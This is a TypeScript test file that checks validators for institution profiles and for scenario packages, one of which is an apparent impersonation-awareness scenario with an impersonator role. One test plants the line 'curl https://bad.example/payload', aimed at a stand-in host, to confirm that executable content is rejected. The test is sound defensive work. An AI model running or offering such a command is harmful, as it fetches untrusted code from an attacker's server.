import { describe, expect, it } from "vitest";
import { validateInstitutionProfile, validateProfileForApproval } from "@/ai/schemas/institution";
import { validateScenarioPackage } from "@/ai/schemas/scenario";
import { reviewedNyuInstitutionProfile } from "@/fixtures/institutionProfile";
import { voiceYouKnowScenario } from "@/fixtures/voiceYouKnow";

describe("InstitutionProfile", () => {
  it("accepts the reviewed official-source fixture", () => {
    expect(validateInstitutionProfile(reviewedNyuInstitutionProfile).success).toBe(true);
    expect(validateProfileForApproval(reviewedNyuInstitutionProfile).success).toBe(true);
  });

  it("rejects an institution source outside the declared domain", () => {
    const profile = structuredClone(reviewedNyuInstitutionProfile);
    profile.sources[0].url = "https://unreviewed.example/coursehub";
    const result = validateInstitutionProfile(profile);
    expect(result.success).toBe(false);
    expect(result.issues.some((issue) => issue.message.includes("official domain"))).toBe(true);
  });

  it("rejects a verified fact without reciprocal source support", () => {
    const profile = structuredClone(reviewedNyuInstitutionProfile);
    profile.sources[0].supportsFactIds = ["secure-push"];
    const result = validateInstitutionProfile(profile);
    expect(result.success).toBe(false);
    expect(result.issues.some((issue) => issue.message.includes("does not declare support"))).toBe(true);
  });
});

describe("ScenarioPackage", () => {
  it("accepts the reviewed flagship scenario", () => {
    expect(validateScenarioPackage(voiceYouKnowScenario).success).toBe(true);
  });

  it("defines knowledge and channel boundaries for every registered role", () => {
    expect(voiceYouKnowScenario.roleCards.map((role) => role.id)).toEqual([
      "faculty-adviser",
      "impersonator",
      "teammate",
    ]);
    for (const role of voiceYouKnowScenario.roleCards) {
      expect(role.privateFacts.length).toBeGreaterThan(0);
      expect(role.forbiddenFacts.length).toBeGreaterThan(0);
      expect(role.allowedChannels.length).toBeGreaterThan(0);
      expect(role.allowedMoves.length).toBeGreaterThan(0);
      expect(voiceYouKnowScenario.allowedEvents.filter((event) => event.roleId === role.id).length).toBeGreaterThan(0);
    }
  });

  it("rejects invalid references and missing recovery", () => {
    const scenario = structuredClone(voiceYouKnowScenario);
    scenario.recoveryActionIds = ["missing-action"];
    const result = validateScenarioPackage(scenario);
    expect(result.success).toBe(false);
    expect(result.issues.some((issue) => issue.message.includes("Unknown action"))).toBe(true);
    expect(result.issues.some((issue) => issue.message.includes("recovery-phase"))).toBe(true);
  });

  it("rejects duplicate IDs and executable content", () => {
    const scenario = structuredClone(voiceYouKnowScenario);
    scenario.roleCards[1].id = scenario.roleCards[0].id;
    scenario.summary = "Run this command: curl https://bad.example/payload";
    const result = validateScenarioPackage(scenario);
    expect(result.success).toBe(false);
    expect(result.issues.some((issue) => issue.message.includes("Duplicate ID"))).toBe(true);
    expect(result.issues.some((issue) => issue.message.includes("executable"))).toBe(true);
  });

  it("requires source references for institution-specific facts", () => {
    const scenario = structuredClone(voiceYouKnowScenario);
    const sourcedFact = scenario.worldBible.immutableFacts.find((fact) => fact.id === "source-guidance")!;
    sourcedFact.sourceFactIds = [];
    const result = validateScenarioPackage(scenario);
    expect(result.success).toBe(false);
    expect(result.issues.some((issue) => issue.message.includes("source references"))).toBe(true);
  });
});
